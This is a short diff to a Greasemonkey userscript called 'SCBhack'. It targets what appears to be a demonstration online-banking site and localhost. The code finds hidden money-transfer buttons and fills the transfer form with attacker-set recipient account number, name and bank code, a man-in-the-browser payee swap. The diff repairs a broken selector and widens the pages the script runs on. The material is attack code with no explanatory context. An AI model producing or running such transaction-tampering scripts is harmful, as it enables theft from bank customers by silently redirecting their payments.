@@ -2,7 +2,7 @@
 // @name           SCBhack
 // @namespace      de.mrx.client
 // @description    Greasemonkey version of the hack.
-// @include        http://127.0.0.1*SCB*
+// @include        http://127.0.0.1*
 // @include        http*securecloudbanking.appspot.com*
 // @require		   http://code.jquery.com/jquery-1.3.2.js
 // ==/UserScript==
@@ -56,9 +56,7 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 			
 		 	});
 		 	
-		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)
-
-[activateReset='true']").each(function(){		 		
+		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){		 		
 		 		$("input:eq(1)").val(globalRC_Acc_Nr);
 				$("input:eq(2)").val(globalRC_Acc_Name);
 				$("input:eq(3)").val(globalRC_Bank_BLZ);
